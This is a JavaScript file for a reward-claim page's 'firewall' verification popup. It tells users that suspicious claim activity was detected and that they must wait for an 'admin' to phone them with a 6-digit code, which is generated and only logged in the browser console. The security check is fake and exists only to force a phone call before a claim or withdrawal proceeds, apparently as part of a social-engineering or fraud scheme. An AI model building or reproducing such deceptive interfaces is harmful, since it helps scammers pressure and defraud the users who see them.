let verificationCode = null;
let attempts = 0;

function showFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) {
        const content = document.getElementById('firewallPopupContent');
        if (content) {
            content.innerHTML = `
                <div class="firewall-warning-icon">📞</div>
                <h2>VERIFICATION REQUIRED</h2>
                <div class="firewall-message">
                    <p>Due to multiple claiming requests detected in the system, a verification call is required before proceeding.</p>
                    <p>Please wait for the admin to call you. You will receive a 6-digit code during the call.</p>
                    <p>Enter the code below to continue.</p>
                </div>
                <div class="verification-input-group">
                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                </div>
                <div class="firewall-note">
                    <p>Waiting for admin to call...</p>
                </div>
                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
            `;
        }
        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
        attempts = 0;
        console.log("📞 Verification Code (give this to user):", verificationCode);
        popup.style.display = 'flex';
        setTimeout(() => {
            const ci = document.getElementById('verificationCode');
            if (ci) ci.focus();
        }, 100);
    }
}

function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCode = function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    
    if (!code || code.length < 6) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter the 6-digit verification code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';
    
    attempts++;
    
    if (code === verificationCode) {
        hideFirewallPopup();
        alert("Verification successful. You may now claim your reward.");
        const withdrawBtn = document.getElementById('claimBtn');
        if (withdrawBtn && withdrawBtn.style.display === 'block') {
            withdrawBtn.click();
        }
    } else {
        let errorMsg = "Invalid verification code. Please try again.";
        if (attempts >= 3) {
            errorMsg = "Too many failed attempts. Please request a new call.";
            if (verifyBtn) {
                verifyBtn.disabled = true;
                verifyBtn.innerHTML = "TOO MANY ATTEMPTS";
                setTimeout(() => {
                    if (verifyBtn) {
                        verifyBtn.disabled = false;
                        verifyBtn.innerHTML = "VERIFY NOW";
                    }
                    attempts = 0;
                }, 30000);
            }
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (verifyBtn && verifyBtn.disabled !== true) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }
    }
};

window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
